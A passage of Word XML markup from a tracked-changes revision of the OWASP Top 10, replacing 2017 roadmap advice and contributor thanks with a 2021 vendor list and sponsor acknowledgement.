        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Probely</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:ins>
    </w:p>
    <w:p w14:paraId="192F0183" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="201" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="202" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Sqreen</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3B59CE3D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="203" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="204" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- Veracode</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7F49D738" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="205" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="206" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>WhiteHat</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> (NTT)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4ED2701C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="207" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A23CA3E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="208" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="209" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Thank you to our sponsors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4A12B831" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="210" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="211" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923162"/>
    </w:p>
    <w:p w14:paraId="6025CAC6" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00841D1E" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="212" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="213" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">The </w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="211"/>
      <w:del w:id="214" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00627CCE" w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>The OWASP Top 10 for 2017 is based primarily on 40+ data submissions from firms that specialize in application security and an industry survey that was completed by over 500 individuals. This data spans vulnerabilities gathered from hundreds of organizations and over 100,000 real-world applications and APIs. The Top 10 items are selected and prioritized according to this prevalence data, in combination with consensus estimates of exploitability, detectability, and impact.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="24E0FBC7" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="215" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6627BFB5" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="216" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="217" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText>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and provides guidance on where to go from here.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1DF2685C" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="218" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="779A5095" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="219" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="220" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Roadmap for future activities</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7612690C" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="221" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B54FA8E" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="222" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="223" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**Don't stop at 10**. There are hundreds of issues that could affect the overall security of a web application as discussed in the [OWASP Developer's Guide](https://www.owasp.org/index.php/OWASP_Guide_Project) and the [OWASP Cheat Sheet Series](https://www.owasp.org/index.php/Category:Cheatsheets). These are essential reading for anyone developing web applications and APIs. Guidance on how to effectively find vulnerabilities in web applications and APIs is provided in the [OWASP Testing Guide](https://www.owasp.org/index.php/OWASP_Testing_Project).</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="461CE38A" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="224" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D5209AF" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="225" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="226" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**Constant change**. The OWASP Top 10 will continue to change. Even without changing a single line of your application's code, you may become vulnerable as new flaws are discovered and attack methods are refined. Please review the advice at the end of the Top 10 in What's Next For Developers, Testers, Organizations and Application Managers for more information.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2F4A75A3" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="227" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="568FB9BE" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="228" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="229" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**Think positive**. When you're ready to stop chasing vulnerabilities and focus on establishing strong application security controls, the [OWASP Proactive Controls](https://www.owasp.org/index.php/OWASP_Proactive_Controls) project provides a starting point to help developers build security into their applications and the [OWASP Application Security Verification Standard (ASVS)](https://www.owasp.org/index.php/ASVS) is a guide for organizations and application reviewers on what to verify.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="62D58B75" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="230" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3553F4C0" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="231" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="232" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**Use tools wisely**. Security vulnerabilities can be quite complex and deeply buried in code. In many cases, the most cost-effective approach for finding and eliminating these weaknesses is human experts armed with advanced tools. Relying on tools alone provides a false sense of security and is not recommended.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="70E13D24" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="233" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BF394A7" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="234" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="235" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**Push left, right, and everywhere**. Focus on making security an integral part of your culture throughout your development organization. Find out more in the [OWASP Software Assurance Maturity Model (SAMM)](https://www.owasp.org/index.php/OWASP_SAMM_Project).</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1A9A86D7" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="236" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3533941D" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="237" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="238" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Attribution</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="16C5E43F" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="239" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40D1F1D8" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="240" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="241" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>We'd like to thank the organizations that contributed their vulnerability data to support the 2017 update. We received more than 40 responses to the call for data. For the first time, all the data contributed to a Top 10 release, and the full list of contributors, is publicly available. We believe this is one of the larger, more diverse collections of vulnerability data ever collected publicly.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5137C4B5" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="242" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63823A67" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="243" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="244" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">As there are more contributors than space here, we have created a dedicated page to recognize the contributions made. We wish to give heartfelt thanks to these organizations for being willing to be on the front lines by publicly sharing vulnerability data from their efforts. We hope this will continue to grow and encourage more organizations to do the same and possibly be seen as one of the key milestones of evidence based security. The OWASP Top 10 would not be possible without these amazing contributions. </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="16077BC7" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="245" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38244C86" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="246" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="247" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>A big thank you to the more than 500 individuals who took the time to complete the industry ranked survey. Your voice helped determine two new additions to the Top 10. The additional comments, notes of encouragement, and criticisms were all appreciated. We know your time is valuable and we wanted to say thanks.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="6398723D" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="248" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A638BE3" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="249" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="250" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>We would like to thank those individuals who contributed significant constructive comments and time reviewing this update to the Top 10. As much as possible, we have listed them on the "Acknowledgements" page.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="07FA7BBA" w14:textId="77777777" w:rsidR="00627CCE" w:rsidRPr="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="251" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="772854B9" w14:textId="358ADECC" w:rsidR="00627CCE" w:rsidRDefault="00627CCE" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="252" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="253" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00627CCE">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>And finally, we'd like to thank in advance all the translators out there who will translate this release of the Top 10 into numerous different languages, helping to make the OWASP Top 10 more accessible to the entire planet.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="61473072" w14:textId="77777777" w:rsidR="00A5669C" w:rsidRDefault="00A5669C" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="254" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B30F974" w14:textId="031A6D58" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="255" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="256" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>OWASP Top 10 2021 team gratefully acknowledge the financial support of Secure Code Warrior and Just Eat.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="30DEC630" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="257" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D65DA41" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="258" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="259" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[![</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
